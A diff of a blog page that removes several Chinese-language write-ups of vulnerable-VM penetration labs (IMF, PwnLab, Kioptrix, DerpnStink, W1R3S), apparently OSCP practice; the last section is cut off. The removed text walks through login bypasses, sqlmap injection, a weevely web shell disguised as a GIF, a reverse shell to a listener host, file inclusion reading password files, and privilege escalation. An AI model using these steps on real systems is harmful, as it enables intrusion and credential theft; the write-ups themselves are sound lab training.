@@ -107,56 +107,6 @@
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/14/IMF/image-20200314185633352.png" alt="image-20200314185633352"></p>
-<p>就一个80</p>
-<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>看源码就行了</p>
-<p><img src="/2020/03/14/IMF/image-20200314185815358.png" alt="image-20200314185815358"></p>
-<p>base64解这个flag 提示我们allthefiles<img src="/2020/03/14/IMF/image-20200314185917680.png" alt="image-20200314185917680"></p>
-<h1 id="0x02-flag2"><a href="#0x02-flag2" class="headerlink" title="0x02 flag2"></a><strong>0x02 flag2</strong></h1><p>我们再细看 这几行js有点怪 拼起来得到flag2 提示imfadministrator</p>
-<p><img src="/2020/03/14/IMF/image-20200314190308552.png" alt="image-20200314190308552"></p>
-<p><img src="/2020/03/14/IMF/image-20200314190426313.png" alt="image-20200314190426313"></p>
-<p><img src="/2020/03/14/IMF/image-20200314190511844.png" alt="image-20200314190511844"></p>
-<h1 id="0x03-flag3"><a href="#0x03-flag3" class="headerlink" title="0x03 flag3"></a><strong>0x03 flag3</strong></h1><p>根据给的路径发现登陆页面<br>根据回显发现rmichaels用户名存在<br>查看源码发现密码使用硬编码<br>如果是硬编码的，我们猜测他使用了strcmp函数，strcmp()是对于相等的字符串返回0，不同的字符串返回非0，但如果比较非字符串，strcmp()将返回null。在php中null==0是true。使得数组看起来与硬编码的密码字符串匹配。<br>所以我们此处传一个数组，将pass字段重命名为pass[]。<br>用户名使用rmichaels，将pass字段重命名为pass[]。</p>
-<p><img src="/2020/03/14/IMF/image-20200314220716954.png" alt="image-20200314220716954"></p>
-<p><img src="/2020/03/14/IMF/image-20200314220834567.png" alt="image-20200314220834567"></p>
-<p><img src="/2020/03/14/IMF/image-20200314220905157.png" alt="image-20200314220905157"></p>
-<h1 id="0x04-flag4"><a href="#0x04-flag4" class="headerlink" title="0x04 flag4"></a><strong>0x04 flag4</strong></h1><p>进到IMF里pagename参数有个upload有注入 sqlmap走起</p>
-<p><img src="/2020/03/14/IMF/image-20200314221515461.png" alt="image-20200314221515461"></p>
-<p>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” –dbs</p>
-<p><img src="/2020/03/14/IMF/image-20200314222022401.png" alt="image-20200314222022401"></p>
-<p>跑admin<br>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” -D admin –tables<br><img src="/2020/03/14/IMF/image-20200314222132550.png" alt="image-20200314222132550"></p>
-<p>新页面<br><img src="/2020/03/14/IMF/image-20200314222241091.png" alt="image-20200314222241091"></p>
-<p><img src="/2020/03/14/IMF/image-20200314222527908.png" alt="image-20200314222527908"></p>
-<p>扫扫更健康</p>
-<p><img src="/2020/03/14/IMF/image-20200314233209089.png" alt="image-20200314233209089"></p>
-<p>解码<br><img src="/2020/03/14/IMF/image-20200314222659426.png" alt="image-20200314222659426"></p>
-<h1 id="0x05-flag5"><a href="#0x05-flag5" class="headerlink" title="0x05 flag5"></a><strong>0x05 flag5</strong></h1><p>访问下解码后的php</p>
-<p><img src="/2020/03/14/IMF/image-20200314222754725.png" alt="image-20200314222754725"></p>
-<p>亲自试水 常规上传别试了 上weevely吧<br>weevely generate t00r ~/shell.php<br><img src="/2020/03/14/IMF/image-20200314223138650.png" alt="image-20200314223138650"><br>改个文件头 文件后缀也变gif<br><img src="/2020/03/14/IMF/image-20200314223316403.png" alt="image-20200314223316403"><br>上传成功</p>
-<p><img src="/2020/03/14/IMF/image-20200314224722194.png" alt="image-20200314224722194"></p>
-<p>源码里这个就是文件落地后的名字<br><img src="/2020/03/14/IMF/image-20200314225025848.png" alt="image-20200314225025848"></p>
-<p>连接后查看flag5 解码<br><img src="/2020/03/14/IMF/image-20200314225510979.png" alt="image-20200314225510979"><br>提示agentservices</p>
-<h1 id="0x06-flag6"><a href="#0x06-flag6" class="headerlink" title="0x06 flag6"></a><strong>0x06 flag6</strong></h1><p>nc去弄个交互式shell<br>攻击机：nc -lvp 2333<br>靶机：:backdoor_reversetcp 192.168.0.106 2333<br><img src="/2020/03/14/IMF/image-20200314230121345.png" alt="image-20200314230121345"></p>
-<p>ps -aux看看进程 发现有knock进程怪不得开始信息收集时候只有80端口<br><img src="/2020/03/14/IMF/image-20200314230358950.png" alt="image-20200314230358950"><br>再看看网络 netstat -antp 发现个7788</p>
-<p><img src="/2020/03/14/IMF/image-20200314230649667.png" alt="image-20200314230649667"></p>
-<p>进一步了解下 之前的flag5提示我们也是代理</p>
-<p><img src="/2020/03/14/IMF/image-20200314230734515.png" alt="image-20200314230734515"></p>
-<p>find全局查agent文件 打开两个</p>
-<p><img src="/2020/03/14/IMF/image-20200314231323432.png" alt="image-20200314231323432"></p>
-<p>根据敲门密码 敲端口</p>
-<p><img src="/2020/03/14/IMF/image-20200314232557766.png" alt="image-20200314232557766"></p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -217,135 +167,6 @@
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/12/Pwnlab-init/image-20200312222253552.png" alt="image-20200312222253552"></p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312222520688.png" alt="image-20200312222520688"></p>
-<p>发现80端口的url是这样的</p>
-<p> <a href="http://192.168.0.104/?page=login" target="_blank" rel="noopener">http://192.168.0.104/?page=login</a><br> <a href="http://192.168.0.104/?page=upload" target="_blank" rel="noopener">http://192.168.0.104/?page=upload</a></p>
-<ol>
-<li>可能存在 LFI 漏洞</li>
-<li>构造URL <a href="http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login" target="_blank" rel="noopener">http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login</a></li>
-<li>发现可以包含读到文件，然后base64解密</li>
-</ol>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312223045306.png" alt="image-20200312223045306"></p>
-<p>代码如下</p>
-<p>—login.php—</p>
-<p><code>&lt;?php
-session_start();require(&quot;config.php&quot;);server, password, $database);if (isset(POST[&#39;pass&#39;]))
-{
-    POST[&#39;user&#39;];
-    _POST[&#39;pass&#39;]);$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);
-$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);
-$stmt-&gt;execute();
-$stmt-&gt;store_Result();
-if ($stmt-&gt;num_rows == 1)
-{
-    $_SESSION[&#39;user&#39;] = $luser;
-    header(&#39;Location: ?page=upload&#39;);
-}
-else
-{
-    echo &quot;Login failed.&quot;;
-}    &lt;?php
-}Username: 
-Password: 
-}
-else
-{
-    ?&gt;</code></p>
-<p>跟着再把<code>require</code>中的config读出来</p>
-<p><code>&lt;?php
-$server   = &quot;localhost&quot;;
-$username = &quot;root&quot;;
-$password = &quot;H4u%QJ_H99&quot;;
-$database = &quot;Users&quot;;
-?&gt;%</code></p>
-<p>顺便也把index和upload的也读了</p>
-<p>—index—</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312234059880.png" alt="image-20200312234059880"></p>
-<p>—upload—</p>
-<?php
-session_start();
-if (!isset($_SESSION['user'])) { die('You must be log in.'); }
-?>
-
-<?php 
-if(isset($_POST['submit'])) {
-    if ($_FILES['file']['error'] <= 0) {
-        $filename  = $_FILES['file']['name'];
-        $filetype  = $_FILES['file']['type'];
-        $uploaddir = 'upload/';
-        $file_ext  = strrchr($filename, '.');
-        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
-        $whitelist = array(".jpg",".jpeg",".gif",".png"); 
-
-
-    if (!(in_array($file_ext, $whitelist))) {
-        die('Not allowed extension, please upload images only.');
-    }
-
-    if(strpos($filetype,'image') === false) {
-        die('Error 001');
-    }
-
-    if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
-        die('Error 002');
-    }
-
-    if(substr_count($filetype, '/')>1){
-        die('Error 003');
-    }
-
-    $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
-
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
-        echo "<img src="/2020/03/12/Pwnlab-init/"".$uploadfile."\""><br>";
-    } else {
-        die('Error 4');
-    }
-}
-}
-
-?><p>%</p>
-<p>在上面已经拿到了MySQL的账号密码了，而且在用nmap扫的时候已经发现3306端口是开放的。</p>
-<p>mysql -h 192.168.0.104 -u root -D Users -p密码是config文件的那个</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312224817346.png" alt="image-20200312224817346"></p>
-<p>拿到用户名</p>
-<h1 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a><strong>0x01 Bypass</strong></h1><p>登录上传文件试试，上面的源码已经知道只能上传图片后缀的文件，而且还判了文件类型和mime</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312225323119.png" alt="image-20200312225323119"></p>
-<p>加个图片标志绕过</p>
-<p>burp上传回来个相对路径 upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312230453184.png" alt="image-20200312230453184"></p>
-<p>让他弹回来 用cookie传入路径</p>
-<p>curl –cookie “lang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gif” “<a href="http://192.168.0.104&quot;" target="_blank" rel="noopener">http://192.168.0.104&quot;</a></p>
-<p>拿到了</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312231440117.png" alt="image-20200312231440117"></p>
-<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’ 获取一个tty</p>
-<p>用之前数据库里拿到的三个账号尝试登陆</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312231648685.png" alt="image-20200312231648685"></p>
-<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>思路是这样的</p>
-<p>1.从截图可以看到，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了</p>
-<p>2.通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件</p>
-<p>针对这种情况，我们可以通过设置bash的$path环境变量来利用</p>
-<p>3.然而当我们调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，</p>
-<p>4.则会先从当前目录来寻找cat指令，相当于我们自己创建一个读文件的cat指令，用这个指令来</p>
-<p>5.读新建取/home/mike/msg.txt文件，我们新建一个cat文件，并添加执行权限</p>
-<p>6.这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，</p>
-<p>我们就会提升到mike权限</p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312232750822.png" alt="image-20200312232750822"></p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312232900069.png" alt="image-20200312232900069"></p>
-<p><img src="/2020/03/12/Pwnlab-init/image-20200312232907099.png" alt="image-20200312232907099"></p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -406,125 +227,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-Kioptrix-Level-1"><a href="#0x00-Kioptrix-Level-1" class="headerlink" title="0x00 Kioptrix_Level_1"></a><strong>0x00 Kioptrix_Level_1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307161830148.png" alt="image-20200307161830148"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307162355257.png" alt="image-20200307162355257"></p>
-<p>利用Samba溢出</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307165821506.png" alt="image-20200307165821506"></p>
-<p>还可以利用Apache OpenSSL漏洞溢出，不展示了。</p>
-<h1 id="0x01-Kioptrix-Level-1-1"><a href="#0x01-Kioptrix-Level-1-1" class="headerlink" title="0x01 Kioptrix_Level_1.1"></a><strong>0x01 Kioptrix_Level_1.1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170524511.png" alt="image-20200307170524511"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170918034.png" alt="image-20200307170918034"></p>
-<p>80的index.php web基础考试来了 想起了考pte的时候</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171747660.png" alt="image-20200307171747660"></p>
-<p>命令执行</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171841255.png" alt="image-20200307171841255"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171849863.png" alt="image-20200307171849863"></p>
-<p>那不客气了 bash弹shell 注意；因为前面的是ping</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172121951.png" alt="image-20200307172121951"></p>
-<p>nc接到</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172251783.png" alt="image-20200307172251783"></p>
-<p>提权 看下版本</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172603208.png" alt="image-20200307172603208"></p>
-<p>这里我们用到了exploitdb的 <a href="https://www.exploit-db.com/download/9542" target="_blank" rel="noopener">https://www.exploit-db.com/download/9542</a></p>
-<p>python3 -m http.server 9999 开个http</p>
-<p>编译命令gcc -o 9542 9542.c</p>
-<p>记得在tmp因为有执行权限这目录 源文件下载下来后缀改成.c编译完就是9542了</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307173559780.png" alt="image-20200307173559780"></p>
-<p>闯关成功！</p>
-<h1 id="0x02-Kioptrix-Level-1-2"><a href="#0x02-Kioptrix-Level-1-2" class="headerlink" title="0x02 Kioptrix_Level_1.2"></a><strong>0x02 Kioptrix_Level_1.2</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307174435555.png" alt="image-20200307174435555"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307175301323.png" alt="image-20200307175301323"></p>
-<p>利用方式很多</p>
-<ul>
-<li>Gallarific<ul>
-<li>gallery.php SQL Injection</li>
-</ul>
-</li>
-<li>LotusCMS<ul>
-<li>RCE</li>
-<li>Code Inject</li>
-</ul>
-</li>
-</ul>
-<p>dirb开始 扫出挺多</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307180238145.png" alt="image-20200307180238145"></p>
-<p>做下host</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181159138.png" alt="image-20200307181159138"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181450474.png" alt="image-20200307181450474"></p>
-<p>msf我们用太多了 oscp考试限制msf使用的 那么这次我们从SQL Injection入手</p>
-<p>在exploit-db上搜索Gallarific的漏洞</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181638504.png" alt="image-20200307181638504"></p>
-<p>注入点：<a href="http://www.site.com/gallery.php?id=null" target="_blank" rel="noopener">www.site.com/gallery.php?id=null</a></p>
-<p>sqlmap跑这个 <a href="http://192.168.0.106/gallery/gallery.php?id=1" target="_blank" rel="noopener">http://192.168.0.106/gallery/gallery.php?id=1</a></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181924830.png" alt="image-20200307181924830"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183256152.png" alt="image-20200307183256152"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183221579.png" alt="image-20200307183221579"></p>
-<p>很久没升级sqlmap了….</p>
-<p>md5解完就是Mast3r和starwars</p>
-<p>loneferret / starwars 22走一波 </p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183819289.png" alt="image-20200307183819289"></p>
-<p>根据提示 sudo ht</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185119942.png" alt="image-20200307185119942"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307184036261.png" alt="image-20200307184036261"></p>
-<p>按F3 打开一个文件 /etc/passwd(或者/etc/sudoers) 编辑loneferrt那一行把1000和100 分别改为0，CTRL+W 保存，如图：</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185258898.png" alt="image-20200307185258898"></p>
-<p>提权成功</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185504768.png" alt="image-20200307185504768"></p>
-<h1 id="0x03-Kioptrix-Level-1-3"><a href="#0x03-Kioptrix-Level-1-3" class="headerlink" title="0x03 Kioptrix_Level_1.3"></a><strong>0x03 Kioptrix_Level_1.3</strong></h1><p>这个包下载下来是个vmdk</p>
-<p>需要我们把上一个刚打完的虚拟机硬盘移除倒入这个</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191650536.png" alt="image-20200307191650536"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191852194.png" alt="image-20200307191852194"></p>
-<p>看看80 先使用nmap通过NetBIOS枚举用户名</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307230439585.png" alt="image-20200307230439585"></p>
-<p>扫出来的账户加万能密码尝试登陆</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231412153.png" alt="image-20200307231412153"></p>
-<p>操作如下</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231835651.png" alt="image-20200307231835651"></p>
-<p>数据库账号拿到</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231942745.png" alt="image-20200307231942745"></p>
-<p>用<strong>sys_exec</strong>运行usermod命令来授予john管理员权限！</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307232351752.png" alt="image-20200307232351752"></p>
-<p>Root 😘</p>
-<h1 id="0x04-Kioptrix-2014"><a href="#0x04-Kioptrix-2014" class="headerlink" title="0x04 Kioptrix 2014"></a><strong>0x04 Kioptrix 2014</strong></h1><p>信息收集</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230108891.png" alt="image-20200308230108891"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230743780.png" alt="image-20200308230743780"></p>
-<p>仅有80和8080端口开着，用的还是Apache 2.2.21服务的</p>
-<p>看来这把是考纯web啊 </p>
-<p>80啥也没有 8080有限制，什么时候都要看下robots和源码 发现了隐藏路径</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230928179.png" alt="image-20200308230928179"></p>
-<p>pChart后台</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231027189.png" alt="image-20200308231027189"></p>
-<p>kali搜下漏洞 看下exp了解到是本地文件包含 那就包吧</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231214272.png" alt="image-20200308231214272"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231309781.png" alt="image-20200308231309781"></p>
-<p>利用方式</p>
-<p>hxxp://localhost/examples/index.php？Action=View&amp;Script=%2f..%2f..%2fetc/passwd</p>
-<p>成了</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231522658.png" alt="image-20200308231522658"></p>
-<p>同理再看下apache配置 为啥8080 ban我 </p>
-<p>哦😯 火狐4.0的UA就可以了 我这用的是google的插件</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231744308.png" alt="image-20200308231744308"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232050054.png" alt="image-20200308232050054"></p>
-<p>phptax远程代码执行漏洞</p>
-<p>msf干净利索</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232653182.png" alt="image-20200308232653182"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232732265.png" alt="image-20200308232732265"></p>
-<p>差个提权 用的FreeBSD 9.0</p>
-<p>kali再搜一下 nc传文件</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235321104.png" alt="image-20200308235321104"></p>
-<p>如下操作提权成功</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235715954.png" alt="image-20200308235715954"></p>
-<p>至此Kioptrix剧中😘</p>
-<h2 id><a href="#" class="headerlink" title></a></h2>
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -585,64 +287,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/06/DerpnStink/image-20200306214933101.png" alt="image-20200306214933101"></p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306215044988.png" alt="image-20200306215044988"></p>
-<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>80端口网页源代码112行</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306215212457.png" alt="image-20200306215212457"></p>
-<h1 id="0x02-获取shell"><a href="#0x02-获取shell" class="headerlink" title="0x02 获取shell"></a><strong>0x02 获取shell</strong></h1><p>dirb爆破一下 发现weblog路径</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306215516647.png" alt="image-20200306215516647"></p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306215733208.png" alt="image-20200306215733208"></p>
-<p>不行 看下之前的源码</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306215758832.png" alt="image-20200306215758832"></p>
-<p>添加本地hosts 根据提示</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306215812440.png" alt="image-20200306215812440"></p>
-<p>访问后发现是个wordpress 后台常规路径是wp-admin  弱密码admin admin</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306220237585.png" alt="image-20200306220237585"></p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306220348156.png" alt="image-20200306220348156"></p>
-<p>admin都进去了 那就上msf吧</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306220953586.png" alt="image-20200306220953586"></p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306221116509.png" alt="image-20200306221116509"></p>
-<p>拿到shell</p>
-<h1 id="0x03-flag2"><a href="#0x03-flag2" class="headerlink" title="0x03 flag2"></a><strong>0x03 flag2</strong></h1><p>cat /var/www/html/weblog/wp-config.php</p>
-<p>数据库的账号密码拿到</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306221339387.png" alt="image-20200306221339387"></p>
-<p>其实是有phpmyadmin目录的 第一次爆的时候我为了速度就中断了 我们访问下</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306221712863.png" alt="image-20200306221712863"></p>
-<p>有个hash </p>
-<p>john爆破暴破出的用户名/密码：unclestinky/wedgie57 </p>
-<p>登录 wordpress flag2到手</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306222011578.png" alt="image-20200306222011578"></p>
-<h1 id="0x04-flag3"><a href="#0x04-flag3" class="headerlink" title="0x04 flag3"></a><strong>0x04 flag3</strong></h1><p>如图 基操（用新用户）</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306222352388.png" alt="image-20200306222352388"></p>
-<h1 id="0x05-flag4"><a href="#0x05-flag4" class="headerlink" title="0x05 flag4"></a><strong>0x05 flag4</strong></h1><p>使用 ftp 登录系统 stinky/wedgie57，下载pcap包</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306222737324.png" alt="image-20200306222737324"></p>
-<p>发现ftp根目录是files 用shell移过去 pcap在desktop的同级目录documents下</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306223312113.png" alt="image-20200306223312113"></p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306223453873.png" alt="image-20200306223453873"></p>
-<p>那就分析下吧</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306225549075.png" alt="image-20200306225549075"></p>
-<p>另一个账号的用户名和密码为： mrderp / derpderpderpderpderpderpderp</p>
-<p>ssh上去 枚举系统发现提示信息</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306225938339.png" alt="image-20200306225938339"></p>
-<p>sudo一下</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306230341042.png" alt="image-20200306230341042"></p>
-<p>以上信息 /home/mrderp/binaries/derpy* 中：binaries 目录中的以 derpy 开头的可执行文件具有root权限。创建文件以提权</p>
-<p>ok看到了黎明前的曙光</p>
-<h1 id="0x06-提权-拿到flag4"><a href="#0x06-提权-拿到flag4" class="headerlink" title="0x06 提权 拿到flag4"></a><strong>0x06 提权 拿到flag4</strong></h1><p>/home/mrderp/下创建binaries目录 再创建derpy.sh 把/bin/bash echo进去 如图</p>
-<p><img src="/2020/03/06/DerpnStink/image-20200306231054176.png" alt="image-20200306231054176"></p>
-<p>ok 下一篇见</p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -703,41 +347,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/05/W1R3S/image-20200305194543215.png" alt="image-20200305194543215"></p>
-<p><img src="/2020/03/05/W1R3S/image-20200305194857422.png" alt="image-20200305194857422"></p>
-<p>四个端口 80开始</p>
-<p>apache的页面 那就扫一下喽 gobuster</p>
-<p><img src="/2020/03/05/W1R3S/image-20200305194943070.png" alt="image-20200305194943070"></p>
-<p><img src="/2020/03/05/W1R3S/image-20200305195911173.png" alt="image-20200305195911173"></p>
-<p>/wordpress和/administrator突破点</p>
-<p>访问了wordpress，也是没什么东西。</p>
-<p>于是访问/administrator，发现cms是cuppa 既然cms都给了 那作者肯定是想要漏洞利用了 kali搜下</p>
-<p><img src="/2020/03/05/W1R3S/image-20200305200011816.png" alt="image-20200305200011816"></p>
-<p><img src="/2020/03/05/W1R3S/image-20200305200112394.png" alt="image-20200305200112394"></p>
-<p>根据文件提示发现有lfi漏洞，根据提示构造url</p>
-<p>curl -s –data-urlencode urlConfig=../../../../../../../../../etc/passwd <a href="http://192.168.0.102/administrator/alerts/alertConfigField.php" target="_blank" rel="noopener">http://192.168.0.102/administrator/alerts/alertConfigField.php</a> </p>
-<p>再换成shadow试试</p>
-<p><img src="/2020/03/05/W1R3S/image-20200305200412146.png" alt="image-20200305200412146"></p>
-<p>john破一下</p>
-<p><img src="/2020/03/05/W1R3S/image-20200305200716703.png" alt="image-20200305200716703"> </p>
-<p>w1r3s用户computer ssh上去</p>
-<h1 id="0x01-成功登陆"><a href="#0x01-成功登陆" class="headerlink" title="0x01 成功登陆"></a><strong>0x01 成功登陆</strong></h1><p><img src="/2020/03/05/W1R3S/image-20200305202128901.png" alt="image-20200305202128901"></p>
-<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>这我就笑了 密码一样的 sudo -l</p>
-<p><img src="/2020/03/05/W1R3S/image-20200305202345800.png" alt="image-20200305202345800"></p>
-<p>这个靶机比较简单 因为准备oscp考试 大佬给的目标34台 按顺序做 </p>
-<p>吃外卖去了 北京吃不完的外卖….</p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -798,56 +407,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p>双生姊妹第二篇</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303213215791.png" alt="image-20200303213215791"></p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303213349966.png" alt="image-20200303213349966"></p>
-<p>可以在上面看到Nmap找到开放了21、22、80端口</p>
-<p>看下80 查看源码发现了作者的名字 除此之外没什么 不过后面会用到的 留着</p>
